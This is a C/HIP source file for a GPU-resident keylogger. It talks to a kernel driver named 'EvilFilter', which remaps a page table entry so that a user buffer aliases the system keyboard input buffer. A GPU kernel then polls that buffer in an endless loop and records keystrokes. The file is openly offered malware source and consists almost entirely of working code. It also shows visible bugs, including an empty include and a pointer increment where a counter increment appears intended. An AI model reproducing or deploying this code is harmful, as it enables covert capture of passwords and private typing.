#include "hip/hip_runtime.h"
#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <hip/hip_runtime.h>
#include <hip/hip_runtime.h>
#include "hip/hip_runtime_api.h"
#include ""
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>
#include <time.h>

#define DEBUG 1

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex) { // , PCHAR KeyMap
	int index = blockIdx.x*blockDim.x + threadIdx.x;
	if (index == 0) {
		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0
			
//			if (keyboardData->MakeCode) {
				if (*keystrokeIndex < 9998) {
					cudaBuffer[*keystrokeIndex++] = KeyMap[keyboardData->MakeCode];
				}
				printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]\n",
					keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
					keyboardData->MakeCode,
					KeyMap[keyboardData->MakeCode],
					keyboardData->UnitId,
					keyboardData->Flags,
					keyboardData->Reserved,
					keyboardData->ExtraInformation);
//			}

			*lastMake = keyboardData->MakeCode;
			*lastModifier = keyboardData->Flags;
				
		}
	}
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the maspped pointer I pass it to the CUDA routine so that it can begin monitoring it
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		PKEYBOARD_INPUT_DATA cudaKeyboardData;
		PSHARED_MEMORY_STRUCT dataToTransmit;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		// Get the Buffer Offset
		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset;
			ULONG keyboardOffset;
			PLLIST listNode;

			kmdfOffset = dataToTransmit->offset;
			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			if (dataToTransmit->largePage) {
				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
			}
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
			// create a pointer with the correct offset
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				if (dataToTransmit->largePage) {
					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
				}
				else {
					keyboardOffset = (ULONG)keyboardData & 0xfff;
				}
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->instruction = 'E';

			// Get the Keyboard Buffer
			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				PCHAR cudaKeyMap;
				PCHAR cudaBuffer;
				PUSHORT lastMake;
				PUSHORT lastModifier;
				PULONG keystrokeIndex;
				UCHAR init0 = 666;
				ULONG init0long = 0;


				printf("Ioctl to EvilFilter device succeeded \n");
				printf("keyboardData=[0x%lx]\n", keyboardData);
				printf(" we now have the real keyboard buffer!!!\n");
				//send address to GPU

				checkCudaErrors(hipSetDevice(0));
				checkCudaErrors(hipSetDeviceFlags(hipDeviceMapHost));


				printf("Allocating lastMake...\n");
				checkCudaErrors(hipMalloc(&lastMake, sizeof(USHORT)));
				printf("Allocating lastModifier...\n");
				checkCudaErrors(hipMalloc(&lastModifier, sizeof(USHORT)));
				printf("Allocating keystrokeIndex...\n");
				checkCudaErrors(hipMalloc(&keystrokeIndex, sizeof(ULONG)));

				printf("Allocating cudaBuffer...\n");
				checkCudaErrors(hipMalloc(&cudaBuffer, sizeof(CHAR) * 10000));
				printf("Allocating cudaKeyMap...\n");
				checkCudaErrors(hipMalloc((void **)&cudaKeyMap, sizeof(char) * 84));

				printf("Copying 0 to lastMake...");
				checkCudaErrors(hipMemcpy(lastMake, &init0, sizeof(USHORT), hipMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying 0 to lastModifier...");
				checkCudaErrors(hipMemcpy(lastModifier, &init0, sizeof(USHORT), hipMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying 0 to keystrokeIndex...");
				checkCudaErrors(hipMemcpy(keystrokeIndex, &init0long, sizeof(ULONG), hipMemcpyHostToDevice));	printf("coppied.\n");
				printf("Copying KeyMap to cudaKeyMap...");
				checkCudaErrors(hipMemcpy(cudaKeyMap, KeyMap, 84 * sizeof(char), hipMemcpyHostToDevice));	printf("coppied.\n");

				printf("Registering KeyboardData for use by CUDA...\n");
				checkCudaErrors(hipHostRegister(keyboardData, 10 * sizeof(char), hipHostRegisterMapped));
				printf("getting device pointer for KeyboardData...\n");
				checkCudaErrors(hipHostGetDevicePointer((void **)&cudaKeyboardData, (void *)keyboardData, 0));
				// TODO: make last make code and last flag here and pass them back and forth to the CUDA kernel
				printf("Launching CUDA process...");
				dim3 grid(1);
				dim3 block(1); 
				while (TRUE) {
					logKeyboardData <<<grid, block >>>(cudaKeyboardData, cudaKeyMap, cudaBuffer, lastMake, lastModifier, keystrokeIndex);
					checkCudaErrors(hipDeviceSynchronize());
				}
				printf("Launched.\n");
			}
		}
		CloseHandle(hControlDevice);
	}
	printf("fin.\n");
	return 0;
}

